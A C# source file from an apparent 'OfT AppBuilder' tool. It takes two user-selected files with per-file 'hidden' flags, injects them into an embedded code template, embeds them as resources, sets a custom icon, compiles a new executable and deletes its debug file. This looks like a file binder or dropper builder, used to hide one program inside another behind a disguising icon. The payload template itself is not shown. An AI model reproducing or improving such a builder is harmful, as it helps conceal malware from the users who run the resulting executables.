using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace OfT
{
    public partial class Creating : Form
    {

        public string sourceName = "Undefined.exe";
        public string[] Files = { "", "" };
        public string[] SafeFiles = { "", "" };
        public string[] Hidden = { "", "" };

        public Image SelectedIcon = null;

        bool taskStopped = false;

        BackgroundWorker worker = new BackgroundWorker();

        public Creating()
        {
            InitializeComponent();
        }

        public void Start()
        {

            worker.WorkerReportsProgress = true;
            worker.WorkerSupportsCancellation = true;

            worker.DoWork += Worker_DoWork;
            worker.RunWorkerAsync();
            worker.RunWorkerCompleted += Worker_RunWorkerCompleted;
            worker.ProgressChanged += Worker_ProgressChanged;
        }

        private void Worker_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            if (!taskStopped)
            {
                progressBar.Value = 100;
                Thread.Sleep(500);
                this.Hide();
                MessageBox.Show("Success !\nYour app has been builded.", "Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            this.Close();
        }

        private void Worker_ProgressChanged(object sender, ProgressChangedEventArgs e)
        {
            Thread.Sleep(125);
            progressBar.Value = e.ProgressPercentage;
        }

        private void Worker_DoWork(object sender, DoWorkEventArgs e)
        {
            if (sourceName.IndexOf(".exe") == -1)
            {
                sourceName += ".exe";
            }
            if (File.Exists(sourceName))
            {
                DialogResult dialogResult = MessageBox.Show("Warning!\nA file named '" + sourceName + "' already exist, would you like to replace it?", "A file with this name already exist.", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
                if (dialogResult == DialogResult.No)
                {
                    taskStopped = true;
                    MessageBox.Show("Operation aborted.", "Operation aborted.", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                else { File.Delete(sourceName); }
            }

            worker.ReportProgress(10);

            if (!File.Exists(sourceName))
            {
                var assembly = Assembly.GetExecutingAssembly();
                var resourceName = "OfT.AppCode.cs";
                string appCode = "";

                using (Stream stream = assembly.GetManifestResourceStream(resourceName))
                using (StreamReader reader = new StreamReader(stream))
                {
                    string result = reader.ReadToEnd();
                    appCode = result;
                }

                worker.ReportProgress(25);

                appCode = appCode.Replace("_FILEONE_", SafeFiles[0].Replace("\\", "/"));
                appCode = appCode.Replace("_FILETWO_", SafeFiles[1].Replace("\\", "/"));

                appCode = appCode.Replace("_F1HIDDEN_", Hidden[0]);
                appCode = appCode.Replace("_F2HIDDEN_", Hidden[1]);

                worker.ReportProgress(50);

                var csc = new CSharpCodeProvider(new Dictionary<string, string>() { { "OfT AppBuilder", "v1.0" } });
                var parameters = new CompilerParameters(new[] { "mscorlib.dll", "System.Core.dll", "System.Net.dll", "System.Net.Sockets.dll", "System.dll" }, sourceName, true);
                saveIcon();
                if (SelectedIcon != null)
                {
                    parameters.CompilerOptions = @"/win32icon:" + "ico.ico";
                }

                worker.ReportProgress(75);

                parameters.EmbeddedResources.Add(Files[0]);
                parameters.EmbeddedResources.Add(Files[1]);

                worker.ReportProgress(85);

                parameters.GenerateExecutable = true;
                CompilerResults results = csc.CompileAssemblyFromSource(parameters, appCode);
                results.Errors.Cast<CompilerError>().ToList().ForEach(error => ErrorOccured());
                worker.ReportProgress(95);
                File.Delete("ico.ico");

                File.Delete(sourceName.Replace(".exe", ".pdb"));

                worker.ReportProgress(99);
                Thread.Sleep(100);
                worker.ReportProgress(100);
            }
        }

        private void ErrorOccured()
        {
            worker.ReportProgress(0);
            DialogResult dialogResult = MessageBox.Show("An error occured.", "Error", MessageBoxButtons.RetryCancel, MessageBoxIcon.Error);
            if (dialogResult == DialogResult.Cancel)
            {
                taskStopped = true;
                MessageBox.Show("Operation aborted.", "Operation aborted.", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            if (dialogResult == DialogResult.Retry)
            {
                taskStopped = true;
                Start();
            }
        }

        private string saveIcon()
        {
            IC.CTI(SelectedIcon, "ico.ico", 256, true);

            return "ico.ico";
        }
    }

    class IC
    {
        public static bool CTI(Image Image, Stream output, int size = 64, bool ratio = false)
        {
            Bitmap inputBitmap = (Bitmap)Image;
            if (inputBitmap != null)
            {
                int width, height;
                if (ratio)
                {
                    width = size;
                    height = inputBitmap.Height / inputBitmap.Width * size;
                }
                else
                {
                    width = height = size;
                }
                Bitmap newBitmap = new Bitmap(inputBitmap, new Size(width, height));
                if (newBitmap != null)
                {
                    using (MemoryStream memoryStream = new MemoryStream())
                    {
                        newBitmap.Save(memoryStream, ImageFormat.Png);

                        BinaryWriter iW = new BinaryWriter(output);
                        if (output != null && iW != null)
                        {
                            iW.Write((byte)0);
                            iW.Write((byte)0);
                            iW.Write((short)1);
                            iW.Write((short)1);
                            iW.Write((byte)width);
                            iW.Write((byte)height);
                            iW.Write((byte)0);
                            iW.Write((byte)0);
                            iW.Write((short)0);
                            iW.Write((short)32);
                            iW.Write((int)memoryStream.Length);
                            iW.Write((int)(6 + 16));
                            iW.Write(memoryStream.ToArray());
                            iW.Flush();
                            return true;
                        }
                    }
                }
                return false;
            }
            return false;
        }

        public static bool CTI(Image Image, string outputPath, int size = 64, bool ratio = false)
        {
            using (FileStream outputStream = new FileStream(outputPath, FileMode.OpenOrCreate))
            {
                return CTI((Bitmap)Image, outputStream, size, ratio);
            }
        }
    }

}
